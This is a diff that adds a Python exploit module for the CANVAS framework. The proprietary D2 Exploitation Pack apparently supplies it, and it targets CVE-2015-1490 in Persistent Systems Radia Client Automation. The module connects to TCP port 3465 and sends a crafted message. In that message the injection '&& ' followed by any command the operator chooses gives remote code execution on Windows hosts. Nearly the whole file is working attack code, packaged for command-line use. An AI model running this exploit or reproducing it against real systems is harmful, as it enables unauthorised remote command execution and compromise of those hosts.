@@ -1,0 +1,90 @@
+#!/usr/bin/env python
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+###
+# STD Modules
+###
+import sys, socket, time
+
+if '.' not in sys.path:
+    sys.path.append('.')
+    sys.path.append('3rdparty/D2SEC/libs')
+
+###
+# Canvas modules
+###
+from d2_exploitutils import *
+from exploitutils import *
+from tcpexploit import tcpexploit
+from canvasexploit import *
+import canvasengine
+import libs.spkproxy as spkproxy
+
+
+NAME                            = "d2sec_radia"
+DESCRIPTION                     = "Persistent Systems Radia Client Automation RCE Vulnerability"
+DOCUMENTATION                   = {}
+DOCUMENTATION['VENDOR']         = "Persistent Systems"
+DOCUMENTATION['Repeatability']  = "Infinite"
+DOCUMENTATION['CVE Name']       = "CVE-2015-1490"
+DOCUMENTATION['CVE Url']        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1490"
+DOCUMENTATION['References']     = ['http://www.zerodayinitiative.com/advisories/ZDI-15-038']
+VERSION                         = "1.0"
+PROPERTY                        = {}
+PROPERTY['TYPE']                = "Exploit"
+PROPERTY['SITE']                = "Remote"
+PROPERTY['ARCH']                = [["Windows"]]
+
+DOCUMENTATION['NOTES'] = """
+"""
+
+CHANGELOG = """
+"""
+
+class theexploit(tcpexploit):
+
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.port = 3465
+    self.host = ""
+    self.version = 0
+    self.done = 0
+    self.name = NAME
+    self.cmd = None
+    self.hostname = None
+    return
+    
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port",self.port))
+    self.cmd = self.argsDict.get("cmd", self.cmd)
+    return
+
+  def run(self):
+    self.getargs()
+    self.setInfo('%s attacking %s:%d (in progress)' % (self.name, self.host, self.port))
+    self.log('[D2] Attacking %s:%d' % (self.hostname, self.port))
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket.connect((self.host, self.port))
+    client_socket.send("\x00USER_TEST\x00PASS_USER\x00NovaPDC.cmd && "+self.cmd+"\x00")
+    time.sleep(1)
+    self.log(client_socket.recv(1024))
+    self.setInfo("%s attacking %s:%d (DONE)" % (self.name, self.host, self.port))
+    return 1
+
+
+  def usage(self):
+    print 'Usage: %s -t host -p port -O cmd:<cmd>' % (sys.argv[0])
+    return
+
+
+
+if __name__ == '__main__':
+    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
+    app = theexploit()
+    ret = standard_callback_commandline(app)
